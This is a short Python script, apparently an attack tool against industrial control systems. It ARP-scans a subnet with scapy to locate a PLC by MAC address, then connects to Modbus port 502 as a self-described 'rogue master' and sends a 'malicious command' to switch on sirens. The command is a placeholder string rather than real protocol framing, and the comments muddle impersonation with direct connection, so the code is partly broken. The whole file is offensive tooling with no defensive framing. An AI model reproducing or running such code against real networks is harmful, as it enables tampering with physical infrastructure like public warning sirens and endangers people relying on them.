import scapy.all as scapy
import socket
import sys

def find_plc_ip():
    # Broadcast ARP request to find PLC in the network
    arp_request = scapy.ARP(pdst="192.168.1.1/24")  # Adjust the subnet as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Look for the PLC by its MAC address (assuming it's known or identifiable)
    plc_mac = "00:1D:9C:C7:B0:35"  # Replace with the PLC's actual MAC address
    for element in answered_list:
        if element[1].hwsrc == plc_mac:
            return element[1].psrc  # Return the PLC's IP address

    return None  # PLC not found

def rogue_master(plc_ip):
    # Simulate a rogue master sending malicious commands
    print(f"[+] Impersonating the PLC at {plc_ip}...")

    # Create a malicious command (e.g., turn on sirens)
    malicious_command = b"SET_SIRENS_ON"  # Replace with the actual command format

    try:
        # Send the command to the switch or other devices
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))  # Assuming port 502 for Modbus TCP
        sock.send(malicious_command)
        print(f"[+] Sent malicious command: {malicious_command}")
        sock.close()
    except Exception as e:
        print(f"[-] Error sending command: {e}")

def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("[-] PLC not found on the network.")
        sys.exit(1)

    print(f"[+] Found PLC at IP: {plc_ip}")

    # Step 2: Act as a rogue master
    rogue_master(plc_ip)

if __name__ == "__main__":
    main()